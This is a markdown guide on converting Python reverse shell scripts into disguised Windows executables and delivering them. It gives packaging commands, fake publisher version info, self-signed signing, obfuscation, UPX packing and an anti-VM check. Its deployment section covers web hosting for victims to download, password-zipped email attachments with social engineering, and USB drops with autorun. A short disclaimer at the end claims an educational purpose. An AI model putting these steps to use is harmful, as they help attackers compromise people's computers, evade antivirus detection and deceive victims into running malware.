# Converting Python to Executable (.exe)

## Overview
This guide shows different methods to convert your Python reverse shell scripts into Windows executables that can be easily deployed and executed on target systems.

## Method 1: PyInstaller (Recommended)

### Installation
```bash
# On Windows
pip install pyinstaller

# On Kali Linux (cross-compilation)
sudo apt install wine
wine pip install pyinstaller
```

### Basic Conversion
```bash
# Simple conversion
pyinstaller --onefile reverse_shell.py

# Hide console window (for disguised apps)
pyinstaller --onefile --noconsole disguised_app.py

# Add custom icon
pyinstaller --onefile --noconsole --icon=app_icon.ico disguised_app.py

# Specify output name
pyinstaller --onefile --noconsole --name="WiFiPasswordRecovery" disguised_app.py
```

### Advanced Options
```bash
# Complete stealth conversion
pyinstaller --onefile --noconsole --icon=legitimate.ico --name="SystemUpdate" \
            --version-file=version_info.txt reverse_shell.py
```

## Method 2: Auto-py-to-exe (GUI Tool)

### Installation
```bash
pip install auto-py-to-exe
```

### Usage
```bash
# Launch GUI
auto-py-to-exe
```

### GUI Configuration:
1. **Script Location**: Select your .py file
2. **Onefile**: Enable for single executable
3. **Console Window**: Disable for disguised apps
4. **Icon**: Add legitimate-looking icon
5. **Additional Files**: Include any resources
6. **Advanced**: Add version info, exclude modules

## Method 3: Nuitka (Performance)

### Installation
```bash
pip install nuitka
```

### Conversion
```bash
# Basic conversion
nuitka --onefile reverse_shell.py

# Windows-specific optimized
nuitka --onefile --windows-disable-console disguised_app.py
```

## Method 4: cx_Freeze

### Installation
```bash
pip install cx_Freeze
```

### Setup Script (setup.py)
```python
from cx_Freeze import setup, Executable

setup(
    name="WiFi Recovery Tool",
    version="2.1",
    description="WiFi Password Recovery",
    executables=[Executable("disguised_app.py", base="Win32GUI")]
)
```

### Build
```bash
python setup.py build
```

## Adding Legitimacy

### 1. Version Information
Create `version_info.txt`:
```
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(2,1,0,0),
    prodvers=(2,1,0,0),
    mask=0x3f,
    flags=0x0,
    OS=0x4,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'TechSolutions Inc.'),
        StringStruct(u'FileDescription', u'WiFi Password Recovery Tool'),
        StringStruct(u'FileVersion', u'2.1.0.0'),
        StringStruct(u'InternalName', u'WiFiRecovery'),
        StringStruct(u'LegalCopyright', u'Copyright (C) 2024'),
        StringStruct(u'OriginalFilename', u'WiFiRecovery.exe'),
        StringStruct(u'ProductName', u'WiFi Recovery Suite'),
        StringStruct(u'ProductVersion', u'2.1.0.0')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
```

### 2. Icon Resources
```bash
# Download legitimate-looking icons
wget https://icon-library.com/images/wifi-icon-png/wifi-icon-png-15.jpg

# Convert to .ico format using online tools or:
magick icon.png icon.ico
```

### 3. Digital Signature (Advanced)
```bash
# Self-signed certificate
makecert -sv mykey.pvk -n "CN=TechSolutions" mycert.cer
pvk2pfx -pvk mykey.pvk -spc mycert.cer -pfx mycert.pfx

# Sign executable
signtool sign /f mycert.pfx /p password /t http://timestamp.digicert.com app.exe
```

## Evasion Techniques

### 1. Obfuscation
```bash
# Install obfuscator
pip install pyarmor

# Obfuscate source
pyarmor obfuscate reverse_shell.py

# Then convert obfuscated version
pyinstaller --onefile dist/reverse_shell.py
```

### 2. Packing/Compression
```bash
# UPX compression
upx --best reverse_shell.exe

# Alternative packers
# - Themida
# - VMProtect
# - ASPack
```

### 3. Anti-Analysis
Add to your Python script:
```python
import os
import sys

# Anti-VM checks
def check_environment():
    # Check for VM artifacts
    vm_artifacts = [
        'VMware', 'VirtualBox', 'QEMU', 'Xen',
        'Parallels', 'Hyper-V'
    ]
    
    for artifact in vm_artifacts:
        if artifact.lower() in os.popen('systeminfo').read().lower():
            sys.exit()
```

## Deployment Strategies

### 1. Web Server Hosting
```bash
# On Kali, serve the executable
sudo service apache2 start
cp reverse_shell.exe /var/www/html/
chmod 644 /var/www/html/reverse_shell.exe

# Victim downloads from:
# http://your-kali-ip/reverse_shell.exe
```

### 2. Email Attachment
- Zip the executable with password
- Use social engineering context
- Rename to look legitimate

### 3. USB Drop
- Copy to USB drives
- Add autorun.inf for automatic execution
- Use legitimate-looking folder structure

## Testing Checklist

Before deployment:
- [ ] Executable runs without errors
- [ ] No console window appears (if disguised)
- [ ] Connects back successfully
- [ ] Survives basic AV scans
- [ ] Icon and properties look legitimate
- [ ] File size is reasonable
- [ ] No obvious Python artifacts

## Troubleshooting

### Common Issues:
1. **ModuleNotFoundError**: Include all dependencies
2. **Large file size**: Exclude unused modules
3. **Slow startup**: Optimize imports
4. **AV detection**: Use different obfuscation
5. **Connection fails**: Check firewall/network

### Debug Mode:
```bash
# Keep console for debugging
pyinstaller --onefile --console reverse_shell.py
```

## Legal Disclaimer

⚠️ **Remember**: 
- Only use in authorized testing environments
- Never deploy on systems you don't own
- This is for educational purposes only
- Always follow responsible disclosure practices